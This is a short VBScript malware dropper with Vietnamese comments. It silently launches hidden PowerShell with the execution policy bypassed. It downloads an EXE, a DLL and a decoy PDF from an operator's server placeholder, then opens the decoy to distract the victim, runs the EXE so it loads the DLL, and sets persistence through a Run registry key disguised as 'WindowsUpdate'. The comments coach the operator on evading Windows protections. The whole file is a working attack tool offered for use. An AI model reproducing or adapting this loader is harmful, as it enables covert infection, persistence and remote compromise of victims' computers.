Set WshShell = CreateObject("WScript.Shell")
strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")

' Thay IP_VPS của bạn vào đây
vps = "http://IP_CUA_BAN/"

' Giải thích các điểm mới:
' 1. Unblock-File: Để Windows cho phép load DLL từ internet.
' 2. -WorkingDirectory: Ép EXE phải tìm DLL ngay tại thư mục Temp.
' 3. Dùng dấu nháy đơn và kép cẩn thận để PowerShell hiểu đúng đường dẫn.

psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
"""$t=$env:TEMP; " & _
"iwr '" & vps & "app.exe' -OutF '$t\app.exe'; " & _
"iwr '" & vps & "vinh.dll' -OutF '$t\vinh.dll'; " & _
"iwr '" & vps & "decoy.pdf' -OutF '$t\decoy.pdf'; " & _
"Unblock-File -Path '$t\app.exe'; Unblock-File -Path '$t\vinh.dll'; " & _
"Start-Process '$t\decoy.pdf'; " & _
"Start-Process -FilePath '$t\app.exe' -WorkingDirectory '$t'; " & _
"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value '$t\app.exe' -PropertyType 'String' -Force"""

' Chạy ngầm hoàn toàn
WshShell.Run psCmd, 0, False
